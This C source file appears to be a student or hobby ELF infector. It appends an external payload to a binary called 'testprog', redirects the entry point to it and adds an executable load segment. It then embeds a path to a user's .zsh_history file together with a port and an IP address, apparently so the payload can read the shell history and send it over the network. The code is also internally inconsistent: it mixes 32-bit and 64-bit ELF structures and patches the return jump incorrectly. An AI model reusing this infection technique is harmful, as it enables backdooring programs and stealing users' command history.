#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <elf.h>

typedef struct {
    uint32_t p_type;
    uint32_t p_flags;
    uint64_t p_offset;
    uint64_t p_vaddr;
    uint64_t p_paddr;
    uint64_t p_filesz;
    uint64_t p_memsz;
    uint64_t p_align;
} Elf64_Phdr;


#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

uint16_t port = 0;
uint32_t addr_ip = 0;

int main(int argc, char *argv[], char *envp[]) {
    port = htons(3002);
    addr_ip = htonl(INADDR_ANY);
    printf("port: %#x %#x\n", port, addr_ip);

    int fd = open("testprog", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("payload size: %p, %#lx\n", payload_p, payload_size_p);

    size_t size = lseek(fd, 0, SEEK_END);
    if (size == (size_t)-1) {
        perror("lseek");
        close(fd);
        return 1;
    }
    printf("size of the file: %zu\n", size);

    // Agrandir le fichier pour accueillir les nouvelles données
    if (ftruncate(fd, size + payload_size_p) == -1) {
        perror("ftruncate");
        close(fd);
        return 1;
    }

    // Lire le header du fichier
    uint8_t header[64];
    if (pread(fd, header, sizeof(header), 0) != sizeof(header)) {
        perror("pread");
        close(fd);
        return 1;
    }

    // Read the ELF header
    Elf32_Ehdr ehdr;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
        perror("pread");
        close(fd);
        return 1;
    }

    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Not an ELF file.\n");
        close(fd);
        return 1;
    }

    // Read the program headers
    Elf32_Phdr phdr[ehdr.e_phnum];
    if (pread(fd, phdr, sizeof(phdr), ehdr.e_phoff) != sizeof(phdr)) {
        perror("pread");
        close(fd);
        return 1;
    }

    // Determine the new entry point
    uint32_t new_entry_point = size;

    // Add the payload to the end of the file
    if (pwrite(fd, payload_p, payload_size_p, size) != payload_size_p) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Update the entry point in the ELF header
    ehdr.e_entry = new_entry_point;
    if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Write the new program header for the payload
	Elf64_Phdr new_phdr = {
        .p_type = PT_LOAD,
        .p_offset = size,
        .p_vaddr = new_entry_point,
        .p_paddr = new_entry_point,
        .p_filesz = payload_size_p,
        .p_memsz = payload_size_p,
        .p_flags = PF_R | PF_X,
        .p_align = 0x1000
    };

    // Append the new program header
	if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf64_Phdr)) != sizeof(new_phdr)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Increment the number of program headers in the ELF header
    ehdr.e_phnum += 1;
    if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

	char *filepath = "/home/maxence/.zsh_history";
	// Write the port and address IP to the end of the payload
	if (pwrite(fd, filepath, sizeof(filepath), size + payload_size_p - 4 - 2 - 1024) != sizeof(filepath)) {
		perror("pwrite");
		close(fd);
		return 1;
	}

    // Add the port and address IP to the payload
    if (pwrite(fd, &port, sizeof(port), size + payload_size_p - 4 - 2) != sizeof(port)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    if (pwrite(fd, &addr_ip, sizeof(addr_ip), size + payload_size_p - 4) != sizeof(addr_ip)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Set the jump to the original entry point
    uint64_t jump = ehdr.e_entry - (size + 4);
    if (pwrite(fd, &jump, sizeof(jump), size + payload_size_p - 4 - 2 - 8) != sizeof(jump)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    printf("Modification completed successfully.\n");

    close(fd);

    return 0;
}
